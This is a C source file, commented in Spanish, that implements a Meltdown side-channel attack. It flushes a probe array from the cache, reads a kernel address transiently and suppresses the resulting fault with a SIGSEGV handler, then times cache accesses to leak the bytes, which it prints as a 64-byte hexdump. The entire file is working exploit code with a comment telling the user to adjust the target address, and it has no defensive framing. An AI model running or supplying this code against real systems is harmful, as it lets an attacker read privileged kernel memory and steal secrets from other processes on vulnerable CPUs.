#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>

#define CACHE_HIT 80  
#define DUMP_SIZE 64  // Número de bytes a leer

static sigjmp_buf bufaux;
static char probe_array[256 * 4096];

void segfault_handler(int sig) {
    siglongjmp(bufaux, 1);
}

void flush_probe_array() {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe_array[i * 4096]);
    }
}

int measure_access_time(int index) {
    uint64_t start, end;
    volatile uint8_t *addr = &probe_array[index * 4096];

    start = __rdtscp(&index);
    (void)*addr;
    end = __rdtscp(&index);

    return end - start;
}

uint8_t meltdown(uint8_t *target_addr) {
    signal(SIGSEGV, segfault_handler);

    while (1) {
        flush_probe_array();
        _mm_mfence();

        if (sigsetjmp(bufaux, 1) == 0) {
            uint8_t value = *target_addr;
            probe_array[value * 4096] += 1;
        }

        for (int i = 0; i < 256; i++) {
            int time = measure_access_time(i);
            if (time < CACHE_HIT) {
                return (uint8_t)i;
            }
        }
    }
}

void hexdump(uint8_t *base_addr, size_t num_bytes) {
    for (size_t i = 0; i < num_bytes; i += 16) {
        printf("%08lx  ", (unsigned long)(base_addr + i));

        // Imprimir hex
        for (int j = 0; j < 16; j++) {
            uint8_t val = meltdown(base_addr + i + j);
            printf("%02x ", val);
        }

        printf(" ");

        // Imprimir ASCII
        for (int j = 0; j < 16; j++) {
            uint8_t val = meltdown(base_addr + i + j);
            printf("%c", isprint(val) ? val : '.');
        }

        printf("\n");
    }
}

int main() {
    uint8_t *target_addr = (uint8_t*)0xffffffffff000000;  // Ajusta según tu entorno

    printf("Meltdown hexdump de 64 bytes desde %p:\n\n", target_addr);
    hexdump(target_addr, DUMP_SIZE);

    return 0;
}
